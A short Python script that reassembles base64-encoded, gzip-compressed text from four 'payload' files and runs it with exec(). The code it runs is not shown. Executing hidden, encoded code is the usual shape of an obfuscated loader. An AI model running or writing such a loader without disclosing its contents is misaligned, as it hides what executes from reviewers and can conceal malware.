from pathlib import Path
import base64
import gzip

parts = [
    Path(f"tools/v18_project_experience_alpha20_payload_{index}.txt").read_text().strip()
    for index in range(1, 5)
]
source = gzip.decompress(base64.b64decode("".join(parts))).decode("utf-8")
exec(compile(source, "v18_project_experience_alpha20_payload.py", "exec"))
